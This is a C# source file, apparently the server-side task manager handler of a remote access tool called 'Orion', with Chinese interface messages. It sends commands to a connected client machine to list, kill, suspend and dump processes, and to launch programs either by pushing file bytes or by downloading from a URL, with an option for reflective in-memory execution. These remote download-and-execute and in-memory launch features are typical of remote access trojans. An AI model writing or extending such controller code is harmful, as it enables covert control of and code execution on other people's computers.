using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Orion.Common.Enums;
using Orion.Common.Messages;
using Orion.Common.Messages.Administration.TaskManager;
using Orion.Common.Messages.Other;
using Orion.Common.Models;
using Orion.Common.Networking;
using Orion.Server.Networking;

namespace Orion.Server.Messages
{
    /// <summary>
    /// Handles messages for interacting with remote tasks.
    /// </summary>
    public class TaskManagerHandler : MessageProcessorBase<Process[]>, IDisposable
    {
        public delegate void ProcessActionPerformedEventHandler(object sender, ProcessAction action, bool result);
        public event ProcessActionPerformedEventHandler ProcessActionPerformed;

        public delegate void OnResponseReceivedEventHandler(object sender, DoProcessDumpResponse response);
        public event OnResponseReceivedEventHandler OnResponseReceived;

        private readonly Client _client;
        public GetProcessesResponse LastProcessesResponse { get; private set; }

        public TaskManagerHandler(Client client) : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
        }

        public override bool CanExecute(IMessage message) => message is DoProcessResponse
                                                             || message is GetProcessesResponse
                                                             || message is DoProcessDumpResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoProcessResponse resp: Execute(sender, resp); break;
                case GetProcessesResponse resp: Execute(sender, resp); break;
                case DoProcessDumpResponse resp: Execute(sender, resp); break;
            }
        }

        private void Execute(ISender client, DoProcessResponse message)
        {
            SynchronizationContext.Post(_ => ProcessActionPerformed?.Invoke(this, message.Action, message.Result), null);
        }

        private void Execute(ISender client, GetProcessesResponse message)
        {
            LastProcessesResponse = message;
            OnReport(message.Processes);
        }

        private void Execute(ISender client, DoProcessDumpResponse message)
        {
            OnResponseReceived?.Invoke(this, message);
        }

        #region Remote Process Operations

        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false)
        {
            if (!File.Exists(remotePath))
            {
                MessageBox.Show($"找不到文件：{remotePath}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            byte[] fileBytes;
            try
            {
                fileBytes = File.ReadAllBytes(remotePath);
            }
            catch (IOException ex)
            {
                const uint ERROR_SHARING_VIOLATION = 32;
                if (((uint)ex.HResult & 0xFFFFu) == ERROR_SHARING_VIOLATION)
                {
                    MessageBox.Show($"文件 '{remotePath}' 正被其他进程占用。", "文件被占用", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                MessageBox.Show($"无法读取文件：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string ext = Path.GetExtension(remotePath);

            if (executeInMemory && !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
            {
                MessageBox.Show("反射执行仅允许 .exe 文件。", "无效的文件类型",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            _client.Send(new DoProcessStart
            {
                FileBytes = fileBytes,
                IsUpdate = isUpdate,
                ExecuteInMemoryDotNet = executeInMemory,
                FileExtension = ext,
                RemotePath = remotePath
            });
        }

        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false)
        {
            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("URL 不能为空。", "无效的 URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            _client.Send(new DoProcessStart
            {
                DownloadUrl = url,
                IsUpdate = isUpdate,
                ExecuteInMemoryDotNet = false
            });
        }

        public void SetTopMost(int pid, bool enable = true)
        {
            _client.Send(new DoSetTopMost { Pid = pid, Enable = enable });
        }

        public void SetWindowState(int pid, bool minimize)
        {
            _client.Send(new DoSetWindowState
            {
                Pid = pid,
                Minimize = minimize
            });
        }

        public void RefreshProcesses()
        {
            _client.Send(new GetProcesses());
        }

        public void EndProcess(int pid)
        {
            _client.Send(new DoProcessEnd { Pid = pid });
        }

        public void DumpProcess(int pid)
        {
            _client.Send(new DoProcessDump { Pid = pid });
        }

        public void SuspendProcess(int pid, bool suspend)
        {
            var message = new DoSuspendProcess { Pid = pid, Suspend = suspend };
            _client.Send(message);
        }


        #endregion

        #region IDisposable

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing) return;

            ProcessActionPerformed = null;
            OnResponseReceived = null;
            LastProcessesResponse = null;
        }

        #endregion
    }
}
